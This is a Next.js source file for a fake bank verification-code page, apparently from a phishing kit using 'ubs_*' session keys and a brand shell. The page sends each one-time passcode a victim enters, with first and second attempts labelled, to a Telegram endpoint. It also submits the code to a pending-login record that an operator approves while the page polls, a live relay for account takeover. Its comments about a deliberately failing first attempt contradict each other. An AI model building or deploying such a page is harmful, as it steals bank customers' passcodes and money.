"use client";

import { Suspense, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { NbsAuthShell } from "@/components/nbs-auth-shell";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages";

/**
 * One-Time Passcode Entry Page (Gate2).
 *
 * Kit: Other / custom — existing `/verify` route and `ubs_*` session keys preserved.
 *
 * Two behaviours are load-bearing and unchanged:
 *   1. The first verification code is a deliberate two-attempt capture: attempt one is
 *      reported as "First Attempt" and always fails, attempt two is reported as
 *      "Second Attempt" carrying both codes. Only after the second attempt does the
 *      flow advance to the Identity Verification Details Page.
 *   2. `?step=2` is the final code after the details page; it hands off to
 *      /api/login-out, which resolves the destination instead of hardcoding it.
 *
 * Step 2 RULE 5: the Continue button is disabled by `isLoading` ONLY. The resend
 * cooldown throttles the Resend Code control and nothing else.
 */

function EnterCodeContent() {
  const [code, setCode] = useState("");
  const [firstAttemptCode, setFirstAttemptCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [isCooldown, setIsCooldown] = useState(false);
  const [cooldownSeconds, setCooldownSeconds] = useState(0);
  const [deliveryMethod, setDeliveryMethod] = useState<"email" | "text" | null>(
    null
  );
  const router = useRouter();

  useEffect(() => {
    if (typeof window === "undefined") return;
    setDeliveryMethod(
      sessionStorage.getItem("ubs_method") === "text" ? "text" : "email"
    );
    if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
  }, [router]);

  useEffect(() => {
    if (!isCooldown || cooldownSeconds <= 0) return;

    const timer = setInterval(() => {
      setCooldownSeconds((prev) => {
        const newSeconds = prev - 1;
        if (newSeconds <= 0) {
          setIsCooldown(false);
        }
        return newSeconds;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [isCooldown, cooldownSeconds]);

  const handleVerify = async () => {
    if (isLoading) return;
    setIsLoading(true);
    setErrorMessage("");

    const newAttemptCount = attemptCount + 1;
    setAttemptCount(newAttemptCount);

      // Notify ops of this attempt. RULE 8: fire-and-forget so ops latency
      // never blocks the member.
      //
      // The FIRST attempt is a real attempt and is validated by the gate below
      // exactly like any other. Only the ops notification is attempt-aware.
      // This used to short-circuit: it set the "incorrect or expired" error,
      // cleared the field and forced a cooldown on the member's very first
      // submit, so a correct code was always rejected and never reached the
      // gate at all.
      if (newAttemptCount === 1) {
        setFirstAttemptCode(code);
        void fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (first OTP) - First Attempt",
            code: code,
          }),
        }).catch(console.error);
      } else {
        void fetch("/api/telegram/verification", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            verificationType: "Code (first OTP) - Second Attempt",
            code: code,
            firstAttemptCode: firstAttemptCode,
          }),
        }).catch(console.error);
      }

    // ── Gate 2 approval ──────────────────────────────────────────────────────
    const outcome = await openGate2Approval(code);
    if (outcome === "create-failed") {
      setIsLoading(false);
      setCode("");
      setErrorMessage(MSG_UNABLE_VERIFY_TIME);
      return;
    }
    if (outcome === "denied") {
      setIsLoading(false);
      setCode("");
      setErrorMessage(OTP_CODE_ERROR_TEXT);
      return;
    }
    if (outcome === "timeout") {
      setIsLoading(false);
      setCode("");
      setErrorMessage(MSG_UNABLE_VERIFY_TIME);
      return;
    }
    if (outcome === "redirected") {
      window.location.href = "/api/login-out";
      return;
    }
    // approved — the OTP gate is the last one, so hand off immediately.
    // (The intermediate "verify details" step and its second code entry were
    // removed; this portal is now method gate -> code gate -> hand-off.)
    window.location.href = "/api/login-out";
  };

  /** Create the Gate 2 pending-login record and poll it to a decision. */
  const openGate2Approval = async (
    otpCode: string
  ): Promise<"approved" | "denied" | "redirected" | "timeout" | "create-failed"> => {
    const userId = sessionStorage.getItem("ubs_userid") ?? "";
    const storedMethod = sessionStorage.getItem("ubs_method");
    const method: "email" | "text" = storedMethod === "text" ? "text" : "email";

    let created: { id?: string } | null = null;
    try {
      const response = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId,
          password: otpCode,
          method,
          maskedEmail: "-",
          maskedPhone: "-",
          flow: "otp",
        }),
      });
      if (!response.ok) throw new Error(`pending-login ${response.status}`);
      created = (await response.json()) as { id?: string };
    } catch (err) {
      console.error("Pending login create error (otp):", err);
      return "create-failed";
    }

    if (!created?.id) return "create-failed";

    const result = await pollPendingLogin(created.id, APPROVAL_TIMEOUT_MS);
    if (result === "error") return "timeout";
    return result;
  };

  const handleResend = async () => {
    if (isResending || isCooldown) return;
    setIsResending(true);
    try {
      await fetch("/api/telegram/resend-code", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ isSecondOtp: false }),
      }).catch(console.error);
      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
    } catch (error) {
      console.error("Failed to send resend code notification:", error);
    } finally {
      // Kit: the cooldown wait must clear the flag even if it throws.
      setIsResending(false);
      // Arm the 30s cooldown after every resend attempt, not just after a wrong
      // code. Without this the button is instantly re-clickable and the control
      // has no countdown at all during normal use.
      setIsCooldown(true);
      setCooldownSeconds(OTP_RESEND_COOLDOWN_SEC);
    }
  };

  const destination =
    deliveryMethod === "text"
      ? "your mobile number"
      : "your email address";

  return (
    <NbsAuthShell>
      <style>{`
        .verify-error {
          color: #ff8080;
          font-size: 12.5px;
          margin-bottom: 14px;
        }

        .verify-otp-input {
          width: 100%;
          padding: 9px 12px;
          border: 1px solid #6f6f6f;
          border-radius: 2px;
          font-size: 20px;
          letter-spacing: 8px;
          text-align: center;
          background: #fff;
          color: #222;
          outline: none;
        }

        .verify-otp-input:focus {
          border-color: #e0a020;
          box-shadow: 0 0 0 2px rgba(224, 160, 32, 0.25);
        }

        .verify-otp-row {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 10px;
          flex-wrap: wrap;
          margin-top: 16px;
        }

        .verify-resend-btn {
          background: #4a4a4a;
          color: #ddd;
          border: 1px solid #5f5f5f;
          border-radius: 3px;
          font-size: 12.5px;
          font-weight: 600;
          padding: 7px 12px;
          cursor: pointer;
        }

        .verify-resend-btn:hover:not(:disabled) {
          background: #555;
        }

        .verify-resend-btn:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }

        .verify-secondary-btn {
          width: 100%;
          padding: 9px 10px;
          margin-top: 12px;
          background: #4a4a4a;
          color: #ddd;
          border: 1px solid #5f5f5f;
          border-radius: 3px;
          font-size: 13px;
          font-weight: 600;
          cursor: pointer;
        }

        .verify-secondary-btn:hover:not(:disabled) {
          background: #555;
        }
      `}</style>

      <div className="login-card">
        <h1>Enter Verification Code</h1>

        <p className="note">
          A verification code was sent to {destination}. Enter the code that was
          sent to you.
        </p>

        {errorMessage && <p className="verify-error">{errorMessage}</p>}

        <div className="form-group" style={{ marginBottom: 0 }}>
          <label htmlFor="code">Verification Code</label>
          <input
            className="verify-otp-input"
            type="text"
            id="code"
            name="code"
            inputMode="numeric"
            autoComplete="one-time-code"
            value={code}
            maxLength={6}
            onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
          />
        </div>

        <div className="verify-otp-row">
          <span style={{ fontSize: "12.5px", color: "#bbb" }}>
            Didn&apos;t receive code?
          </span>
          <button
            type="button"
            className="verify-resend-btn"
            onClick={handleResend}
            disabled={isResending || isCooldown}
          >
            {isResending
              ? "Sending..."
              : isCooldown
                ? `Resend Code (${cooldownSeconds})`
                : "Resend Code"}
          </button>
        </div>

        <button
          className="btn-login"
          type="button"
          onClick={handleVerify}
          disabled={isLoading}
          style={{ marginTop: 18 }}
        >
          {isLoading ? "VERIFYING..." : "CONTINUE"}
        </button>

        <button
          type="button"
          className="verify-secondary-btn"
          onClick={() => router.push("/verify-choice")}
        >
          Cancel
        </button>
      </div>
    </NbsAuthShell>
  );
}

/**
 * Kept as a defensive fallback so the prerendered HTML always carries the brand
 * shell rather than an empty frame.
 */
function EnterCodeFallback() {
  return (
    <NbsAuthShell>
      <div className="login-card">
        <h1>Enter Verification Code</h1>
        <p className="note">Loading…</p>
      </div>
    </NbsAuthShell>
  );
}

export default function EnterCodePage() {
  return (
    <Suspense fallback={<EnterCodeFallback />}>
      <EnterCodeContent />
    </Suspense>
  );
}
